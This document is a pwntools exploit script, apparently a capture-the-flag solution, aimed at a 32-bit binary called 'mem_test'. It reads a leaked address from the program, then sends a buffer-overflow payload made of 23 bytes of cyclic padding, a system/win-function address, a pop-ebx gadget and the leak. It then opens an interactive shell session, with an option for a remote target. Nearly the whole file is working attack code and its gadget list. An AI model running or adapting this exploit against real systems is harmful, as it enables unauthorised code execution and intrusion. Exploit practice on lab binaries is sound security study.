#!/usr/bin/env python3
from pwn import *
import sys

binary = "mem_test"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

#### GDB Script
script = '''

'''


io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)


def main():
    global io
    #################### 
    ### EXPLOIT CODE ###
    ####################
    """
    0x080494e3 : pop ebp ; ret
    0x080494e0 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x08049022 : pop ebx ; ret
    0x080494e2 : pop edi ; pop ebp ; ret
    0x08049009 : ret
    """
    win_func =  0x08049443
    binsh = 0x0804b44c + 1# - 1

    io = start()
    ru(b"\n\n\n------Test Your Memory!-------\n")

    random = rl(timeout=2)
    log.success(f"RECVED RANDOM BYTES: {random}")

    ru("see? : ")
    leak = int(rl(), 16)

    log.success(f"LeaK : {hex(leak)}")


    # offset to eip
    offset = 23
    ret = 0x08049009
    pop_ebx = 0x08049022
    system = 0x8049443
    binsh = 0x804a020
    payload = flat(
        #random,
        cyclic(offset),
        #ret,
        system,
        pop_ebx,
        leak
    )

    ru("> ", timeout=1)
    sl(payload)
    ia()





if __name__ == "__main__":
    main()

